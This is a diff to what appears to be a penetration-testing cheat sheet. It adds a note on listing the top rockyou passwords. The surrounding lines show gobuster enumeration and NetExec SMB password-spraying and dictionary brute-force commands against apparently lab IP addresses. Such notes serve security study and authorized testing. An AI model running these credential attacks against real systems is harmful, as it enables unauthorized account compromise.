@@ -190,6 +190,9 @@ gobuster dir -u http://10.20.10.31 -w /usr/share/wordlists/seclists/Discovery/We
 # Password Spraying Attack
 nxc smb 10.129.2.28 -u users.txt -p password1 password2 password3 password4 --ignore-pw-decoding
 
+# Note: To see the top 5 most used passwords, use this command:
+head -n 5 /usr/share/wordlists/rockyou.txt
+
 # Brute Force with a wordlist (Dictionary Attack)
 nxc smb 10.129.2.28 -u users.txt -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
 
